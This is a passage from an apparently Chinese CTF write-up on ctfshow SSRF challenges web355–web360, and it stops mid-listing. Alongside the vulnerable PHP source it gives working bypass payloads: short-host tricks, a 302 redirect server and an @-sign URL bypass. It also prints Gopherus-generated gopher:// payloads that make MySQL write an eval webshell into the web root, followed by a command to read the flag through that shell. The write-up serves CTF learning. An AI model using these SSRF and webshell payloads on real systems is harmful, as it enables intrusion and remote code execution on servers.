data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjM5MjMzMTY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJDRDc2ODYyMy1EQjQzLTRFRTMtQTkzRi05REE3QUFCNzBGRTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUNENzY4NjIzLURCNDMtNEVFMy1BOTNGLTlEQTdBQUI3MEZFMSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTIzOTIzMzE2LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09JUU1JThGJUFGJUU0JUJCJUE1JUU4JUE3JUEzJUU2JTlFJTkwJUU1JTg4JUIwMTI3LjAuMC4xJUU3JTlBJTg0JUU1JTlGJTlGJUU1JTkwJThEJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">SSRF 域名解析到 127.0.0.1</span>，</p>\n<p>​\t\t这里的 payload ：<span class=\"exturl\" data-url=\"aHR0cDovL3NhZmUudGFvYmFvLmNvbS9mbGFnLnBocCVFMyU4MCU4Mg==\">http://safe.taobao.com/flag.php。</span></p>\n<h1 id=\"web355\"><a class=\"markdownIt-Anchor\" href=\"#web355\">#</a> web355：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$host</span>=<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>((<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$host</span>)&lt;=<span class=\"number\">5</span>))&#123;</span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>​\t\t这里要求长度小于五，直接用 http://0/flag.php 去绕过。</p>\n<h1 id=\"web356\"><a class=\"markdownIt-Anchor\" href=\"#web356\">#</a> web356：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$host</span>=<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>((<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$host</span>)&lt;=<span class=\"number\">3</span>))&#123;</span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t长度小于 3，还是上一题那个 payload 一把梭。</p>\n<h1 id=\"web357\"><a class=\"markdownIt-Anchor\" href=\"#web357\">#</a> web357：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">gethostbyname</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>]);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>.<span class=\"variable\">$ip</span>.<span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">filter_var</span>(<span class=\"variable\">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;ip!&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;scheme&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\tai 的解释如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"comment\">// 关闭PHP的错误报告，这意味着任何错误或警告都不会显示给用户  </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 高亮显示当前文件的源代码。这通常用于调试目的，但在生产环境中显示源代码是不安全的。  </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 从POST请求中获取名为&#x27;url&#x27;的参数值，并将其存储在变量$url中  </span></span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 使用parse_url函数解析$url，并将解析结果存储在数组$x中  </span></span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 检查$x数组中的&#x27;scheme&#x27;键是否等于&#x27;http&#x27;或&#x27;https&#x27;  </span></span><br><span class=\"line\"><span class=\"comment\">// 这是为了确保只处理HTTP或HTTPS协议的URL，从而避免潜在的协议漏洞（如URL重定向攻击）  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]===<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">    <span class=\"comment\">// 使用gethostbyname函数获取$url中主机名的IP地址，并将其存储在变量$ip中  </span></span><br><span class=\"line\">    <span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">gethostbyname</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>]);  </span><br><span class=\"line\">      </span><br><span class=\"line\">    <span class=\"comment\">// 输出获取的IP地址，前面加上HTML的换行标签  </span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>.<span class=\"variable\">$ip</span>.<span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class=\"line\">      </span><br><span class=\"line\">    <span class=\"comment\">// 使用filter_var函数和FILTER_VALIDATE_IP过滤器来验证$ip是否为有效的IP地址  </span></span><br><span class=\"line\">    <span class=\"comment\">// 同时，使用FILTER_FLAG_NO_PRIV_RANGE和FILTER_FLAG_NO_RES_RANGE标志来排除私有和保留的IP地址范围  </span></span><br><span class=\"line\">    <span class=\"comment\">// 如果$ip不是有效的非私有/非保留IP地址，则执行die函数，终止脚本执行并输出&#x27;ip!&#x27;  </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">filter_var</span>(<span class=\"variable\">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;ip!&#x27;</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">      </span><br><span class=\"line\">    <span class=\"comment\">// 如果IP地址验证通过，则使用file_get_contents函数尝试从用户提交的URL中获取内容，并输出  </span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>]);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"comment\">// 如果$url的协议不是HTTP或HTTPS，则执行die函数，终止脚本执行并输出&#x27;scheme&#x27;  </span></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;scheme&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t这里打 302 跳转，在公网服务器上写入如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: http://127.0.0.1:80/flag.php&quot;</span>,<span class=\"literal\">TRUE</span>,<span class=\"number\">302</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后使用如下命令临时运行：</p>\n<blockquote>\n<p>php -S 0.0.0.0:2333</p>\n</blockquote>\n<p>​\t\t传入 url 参数为：</p>\n<blockquote>\n<p>url=http://&lt;vps_ip&gt;: 端口</p>\n</blockquote>\n<h1 id=\"web358\"><a class=\"markdownIt-Anchor\" href=\"#web358\">#</a> web358：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;</span>,<span class=\"variable\">$url</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t这里使用正则表达式检查 $url 是否以 &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2N0Zg==\">http://ctf</span>.“开头，并且以”.show&quot; 结尾（不区分大小写）， 前面呢就利用 @符号就可以绕过，后面利用 get 传参方式绕过：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2N0Zi5AMTI3LjAuMC4xL2ZsYWcucGhwP3Nob3c=\">http://ctf.@127.0.0.1/flag.php?show</span></p>\n</blockquote>\n<h1 id=\"web359\"><a class=\"markdownIt-Anchor\" href=\"#web359\">#</a> web359：</h1>\n<p>​\t\t随便输入了一个账号密码后，跳转到 check.php 文件，抓包后 post 出现了一个 returl，由此，利用 gopher 协议构造攻击，利用 gopherus 生成 gopher 语句攻击。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class=\"line\">└─# python2 gopherus.py --exploit mysql</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  ________              .__</span><br><span class=\"line\"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class=\"line\">/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/</span><br><span class=\"line\">\\    \\_\\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \\  ___/|  | \\/  |  /\\___ \\</span><br><span class=\"line\"> \\______  /\\____/|   __/|___|  /\\___  &gt;__|  |____//____  &gt;</span><br><span class=\"line\">        \\/       |__|        \\/     \\/                 \\/</span><br><span class=\"line\"></span><br><span class=\"line\">                author: $_SpyD3r_$</span><br><span class=\"line\"></span><br><span class=\"line\">For making it work username should not be password protected!!!</span><br><span class=\"line\"></span><br><span class=\"line\">Give MySQL username: root</span><br><span class=\"line\">Give query to execute: select &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Your gopher link is ready to do SSRF :</span><br><span class=\"line\"></span><br><span class=\"line\">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%63%6d%64%22%5d%29%3b%3f%e3%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class=\"line\"></span><br><span class=\"line\">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure>\n<p>​\t\t生成的 gopher 协议不能直接用，需要经过 url 编码之后才能用：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:3306/<span class=\"built_in\">_</span><span class=\"comment\">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2563%256d%2564%2522%255d%2529%253b%253f%25e3%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t不知道为啥，我自己的 payload 用不了，贴一个别人的吧：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:3306/<span class=\"built_in\">_</span><span class=\"comment\">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后访问 1.php 用 post 传一个 1=system (“cat+/flag.txt”); 即可。</p>\n<h1 id=\"web360\"><a class=\"markdownIt-Anchor\" href=\"#web360\">#</a> web360：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>​\t\t这么用：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 